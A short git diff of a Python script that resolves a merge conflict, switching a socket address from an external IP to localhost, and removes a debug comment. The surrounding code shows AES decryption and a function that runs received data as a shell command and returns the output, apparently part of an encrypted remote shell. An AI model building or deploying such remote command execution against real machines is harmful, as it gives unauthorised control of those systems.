@@ -14,11 +14,7 @@ from Crypto.Cipher import AES
 HVA = '145.109.171.88'
 l = 'localhost'
 socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-<<<<<<< HEAD
-serverAddress = HVA, 9999
-=======
 serverAddress = l, 5555
->>>>>>> bec8c08b577755e6690ddbdd725b0551122ff20c
 
 global key
 key = []
@@ -39,7 +35,6 @@ def decryptAES(ciphertext, key):
 
 #   --> Execute a command and return the result of it
 def popenExecution(data):
-    #pdb.set_trace()
     command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, 
     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     return str(command.stdout.read() + command.stderr.read(), 'utf-8')
